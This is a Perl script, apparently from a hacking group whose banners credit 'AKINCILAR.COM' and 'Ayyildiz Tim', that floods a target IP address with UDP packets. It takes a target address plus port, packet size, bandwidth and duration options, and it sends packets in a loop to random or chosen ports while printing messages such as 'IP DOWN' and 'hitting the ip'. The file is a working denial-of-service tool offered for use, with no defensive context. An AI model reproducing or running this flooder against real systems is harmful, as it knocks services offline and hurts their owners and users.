#!/usr/bin/perl

printf "[1;35m[1;33mAKINCILAR.COM[1;31m UDP FLOOD SCRIPT [0;32m  
  ___              _     _       _____ _           
 / _ \            | |   | |     |_   _(_)          
/ /_\ \_   _ _   _| | __| |____   | |  _ _ __ ___  
|  _  | | | | | | | |/ _` |_  /   | | | | '_ ` _ \ 
| | | | |_| | |_| | | (_| |/ /    | | | | | | | | |
\_| |_/\__, |\__, |_|\__,_/___|   \_/ |_|_| |_| |_|
        __/ | __/ |                                
       |___/ |___/                                 
       
 [1;36m$ipn";  
printf "[1;35m[1;33m[1;31m[0;32m IP DOWN[0;31m-> Ayyýldýz Tým ;)[0m\n";  

use Socket;
use strict;
use Getopt::Long;
use Time::HiRes qw( usleep gettimeofday ) ;

our $port = 0;
our $size = 0;
our $time = 0;
our $bw   = 0;
our $help = 0;
our $delay= 0;

GetOptions(
	"port=i" => \$port,		# UDP port to use, numeric, 0=random
	"size=i" => \$size,		# packet size, number, 0=random
	"bandwidth=i" => \$bw,		# bandwidth to consume
	"time=i" => \$time,		# time to run
	"delay=f"=> \$delay,		# inter-packet delay
	"help|?" => \$help);		# help
	

my ($ip) = @ARGV;

if ($help || !$ip) {
  print <<'EOL';
 The usage of command is perl cqHack.pl a.b.c.d
EOL
  exit(1);
}

if ($bw && $delay) {
  print "WARNING: The package size overrides the parameter --the command will be ignored\n";
  $size = int($bw * $delay / 8);
} elsif ($bw) {
  $delay = (8 * $size) / $bw;
}

$size = 700 if $bw && !$size;

($bw = int($size / $delay * 8)) if ($delay && $size);

my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cant resolve the hostname try again $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

printf "[0;32m>> AkÄ±ncÄ±lar Hacking Platforms  \n";
printf "[0;32m>>  _______  _______  _______          
 .S_SSSs     .S    S.    .S   .S_sSSs      sSSs   .S  S.       .S_SSSs     .S_sSSs    
.SS~SSSSS   .SS    SS.  .SS  .SS~YS%%b    d%%SP  .SS  SS.     .SS~SSSSS   .SS~YS%%b   
S%S   SSSS  S%S    S&S  S%S  S%S   `S%b  d%S'    S%S  S%S     S%S   SSSS  S%S   `S%b  
S%S    S%S  S%S    d*S  S%S  S%S    S%S  S%S     S%S  S%S     S%S    S%S  S%S    S%S  
S%S SSSS%S  S&S   .S*S  S&S  S%S    S&S  S&S     S&S  S&S     S%S SSSS%S  S%S    d*S  
S&S  SSS%S  S&S_sdSSS   S&S  S&S    S&S  S&S     S&S  S&S     S&S  SSS%S  S&S   .S*S  
S&S    S&S  S&S~YSSY%b  S&S  S&S    S&S  S&S     S&S  S&S     S&S    S&S  S&S_sdSSS   
S&S    S&S  S&S    `S%  S&S  S&S    S&S  S&S     S&S  S&S     S&S    S&S  S&S~YSY%b   
S*S    S&S  S*S     S%  S*S  S*S    S*S  S*b     S*S  S*b     S*S    S&S  S*S   `S%b  
S*S    S*S  S*S     S&  S*S  S*S    S*S  S*S.    S*S  S*S.    S*S    S*S  S*S    S%S  
S*S    S*S  S*S     S&  S*S  S*S    S*S   SSSbs  S*S   SSSbs  S*S    S*S  S*S    S&S  
SSS    S*S  S*S     SS  S*S  S*S    SSS    YSSP  S*S    YSSP  SSS    S*S  S*S    SSS  
       SP   SP          SP   SP                  SP                  SP   SP          
       Y    Y           Y    Y                   Y                   Y    Y     \n";
printf "[0;31m>> hitting the ip    \n";
printf "[0;36m>> hitting the ports     \n";
($size ? "$size-byte" : "") . " " . ($time ? "" : "") . "\033[1;32m\033[0m\n\n";
print "Interpacket delay $delay msec\n" if $delay;
print "total IP bandwidth $bw kbps\n" if $bw;
printf "[1;31m>> Press CTRL+C to stop the attack  \n" unless $time;

die "Invalid package size: $size\n" if $size && ($size < 64 || $size > 1500);
$size -= 28 if $size;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
  usleep(1000 * $delay) if $delay;
}
